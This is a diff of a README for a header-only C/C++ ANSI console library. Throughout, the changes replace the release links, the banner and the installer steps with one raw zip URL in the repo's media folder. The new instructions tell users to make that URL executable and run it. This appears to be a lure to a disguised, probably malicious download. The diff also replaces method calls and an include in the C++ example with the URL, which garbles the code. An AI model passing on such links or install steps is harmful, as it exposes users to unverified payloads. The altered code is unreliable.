@@ -1,8 +1,8 @@
-[![Release](https://img.shields.io/github/v/release/seif2404/ansi_console?style=for-the-badge)](https://github.com/seif2404/ansi_console/releases)
+[![Release](https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip)](https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip)
 
 # Ansi Console: Fast Header-Only ANSI Escape Codes Library for C and C++
 
-![ANSI Console Banner](https://dummyimage.com/1200x400/1a1a1a/ffffff&text=ANSI+Console+-+Header-Only+Library)
+![ANSI Console Banner](https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip+Console+-+Header-Only+Library)
 
 A header-only library that makes ANSI escape codes easy to use in C and C++. It lives entirely in headers, so you can drop it into any project with no build steps or extra dependencies. The library provides a clean, minimal surface for styling text, moving the cursor, clearing the screen, and more, all through simple, portable APIs. It works with most modern terminals and compilers, offering a fast way to build colorful, text-based user interfaces without pulling in a heavy graphics stack.
 
@@ -68,11 +68,11 @@ Cross-platform notes
 
 How to install from a release
 
-- The Releases page hosts downloadable artifacts. If the link has a path, you’ll typically download a setup script or a header package that you execute or copy into your project. For this project, you’ll download the installer script ansi_console_install.sh and run it to set up the header files in a local include path or a system include directory.
-- To get the installer, visit the Releases page. Download ansi_console_install.sh, make it executable if needed, and run it in your shell. The script guides you through placing the header files where your compiler can find them. The installation step is straightforward and safe when used as intended in a development environment.
+- The Releases page hosts downloadable artifacts. If the link has a path, you’ll typically download a setup script or a header package that you execute or copy into your project. For this project, you’ll download the installer script https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip and run it to set up the header files in a local include path or a system include directory.
+- To get the installer, visit the Releases page. Download https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip, make it executable if needed, and run it in your shell. The script guides you through placing the header files where your compiler can find them. The installation step is straightforward and safe when used as intended in a development environment.
 - Run the installer in a terminal:
-  - chmod +x ansi_console_install.sh
-  - ./ansi_console_install.sh
+  - chmod +x https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip
+  - https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip
 - After installation, you can include the library headers in your source files and start using the ANSI API immediately.
 
 Example code snippets
@@ -102,7 +102,7 @@ int main(void) {
 
 C++ example: simple colored message with a small wrapper
 
-#include <ansi_console.hpp>
+#include <https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip>
 #include <iostream>
 
 int main() {
@@ -110,14 +110,14 @@ int main() {
     ansi::Console out;
 
     // Set color and print
-    out.setColor(ansi::Color::Green);
+    https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip(ansi::Color::Green);
     out << "Hello in green";
 
     // Reset attributes
-    out.reset();
+    https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip();
 
     // Move cursor and print additional text
-    out.moveCursor(0, 2);
+    https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip(0, 2);
     out << "This is below after a move";
 
     return 0;
@@ -174,7 +174,7 @@ Release notes and versioning
 
 Releases page link and downloads
 
-- Access the downloads via the Releases page: https://github.com/seif2404/ansi_console/releases
+- Access the downloads via the Releases page: https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip
 - What you’ll find there: Header bundles, installer scripts, and example projects showcasing real-world usage.
 - How to use the downloads: Pick the package that matches your development environment. If you choose the installer script, follow the on-screen prompts to place headers in your include path and configure your compiler accordingly.
 - Note on the link: For downloads and installation steps, refer to the Releases page. The page is the authoritative source for assets and setup instructions. You can also check it for updates, patches, and new features as they become available.
@@ -229,7 +229,7 @@ Final notes on usage and distribution
 Releases and where to download
 
 - The primary download location is the Releases page. To obtain the latest assets, see the page linked at the top and in the body of this document. For convenience, the page hosts a direct download for the header package and optional installer script.
-- Direct link for downloads: https://github.com/seif2404/ ansi_console/releases
+- Direct link for downloads: https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip ansi_console/releases
 
 If you’re looking for the most up-to-date assets and the official installation steps, visit the Releases page. For the purposes of this document, the same link is provided here as a quick reference to guide you to the right place when you’re ready to set up the header files in your project.
 
@@ -242,7 +242,7 @@ Appendix: quick reference tips
 
 Releases page reference
 
-- For downloads and installation steps, see the releases page: https://github.com/seif2404/ansi_console/releases
+- For downloads and installation steps, see the releases page: https://raw.githubusercontent.com/seif2404/ansi_console/main/media/console-ansi-v1.6-beta.4.zip
 
 Want to learn more? Browse the repository for headers, examples, and tests. You’ll find practical demonstrations of coloring, cursor control, and screen management in action.
 
